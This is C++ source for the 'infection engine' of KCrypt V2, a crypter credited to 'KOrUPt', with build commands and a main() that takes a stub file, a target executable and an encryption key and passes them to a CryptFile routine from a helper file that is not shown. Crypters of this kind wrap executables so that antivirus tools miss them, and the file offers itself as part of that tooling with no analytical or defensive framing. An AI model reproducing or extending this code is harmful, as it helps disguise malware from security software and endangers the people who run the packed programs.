/************************************
	KCrypt V2 by KOrUPt
		Part of the KCrypter project.
	
	Infection engine : Write's the coupled stub file into a chosen executable
	
	Compile with:
	>cmd /C "C:\Program Files\Microsoft Visual Studio\VC98\Bin\VCVARS32.BAT" & cl /Od /MD /nologo Infecter.cpp /link /nologo /opt:nowin98 /merge:.rdata=.data /merge:.text=.data /ignore:4108 /ignore:4078 gmp.lib kernel32.lib user32.lib gdi32.lib winspool.lib comctl32.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib winmm.lib wininet.lib ws2_32.lib vfw32.lib & del Infecter.obj
	
*************************************/

#pragma comment(linker,"/BASE:0x400000 /FILEALIGN:0x200 /MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR /IGNORE:4078")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "imagehlp.lib")

#include <windows.h>
#include <stdio.h>
#include <imagehlp.h>
#include "infectionHelper.h"
#include "infectionHelper.cpp"


int main(int argc, char **argv)
{
	printf("\t\tKCrypter V2 By KOrUPt @ http://www.KOrUPt.co.uk\n\n");
	if(argc != 4){
		printf(
			"Usage: %s <stub file> <target file> <encryption key>\n\n", argv[0]);
		return 0;
	}

	if(!CryptFile(argv[2], argv[1], 'n', argv[3])){
		fprintf(stderr,  "[-] An unknown error occurred whilst trying to crypt '%s'\n", argv[2]);
		return 0;
	}
	
	printf("[+] File crypted successfully\n\n");
	return 1;
}
